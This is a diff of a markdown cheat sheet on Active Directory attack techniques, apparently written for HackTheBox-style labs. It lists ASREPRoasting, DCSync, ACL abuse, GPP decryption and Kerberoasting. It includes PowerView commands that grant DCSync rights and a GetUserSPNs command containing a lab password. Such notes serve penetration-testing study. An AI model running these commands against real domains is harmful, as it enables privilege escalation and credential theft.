@@ -18,27 +18,33 @@ GetNPUsers.py BLACKFIELD/ -usersfile users.txt -format hashcat
 ```
 
 # Active Directory Exploitation Strategies
- - [ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- - **WriteDACL**
-   - [WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)
- - [Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
- - [NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- - [DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
-   - **With PowerView**:
-    ```
-    whoami /all
-    Add-ADGroupMember -Identity "Exchange Windows Permissions" -members svc-alfresco
-    net group "Exchange Windows Permissions" /add svc-alfresco
-    Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
-    Add-ObjectACL -PrincipalIdentity test123 -Credential $cred -Rights DCSync
-    Get-DomainUser -Identity svc-alfresco
-    Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
-    ```
- - [SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)
-   - ```gppdecrypt```
- - [Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
-   - GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100```
-   - Requires an account user with a service principal name (SPN)
+[ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
+
+[WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)
+
+[Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)
+
+[NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
+
+[DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
+**With PowerView**:
+```
+whoami /all
+Add-ADGroupMember -Identity "Exchange Windows Permissions" -members svc-alfresco
+net group "Exchange Windows Permissions" /add svc-alfresco
+Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
+Add-ObjectACL -PrincipalIdentity test123 -Credential $cred -Rights DCSync
+Get-DomainUser -Identity svc-alfresco
+Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
+```
+
+[SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)
+```gppdecrypt```
+
+[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
+**Requires:** Domain Credentials
+**Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets
+`GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100`
 
 ## Active Directory Tools
  - [PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
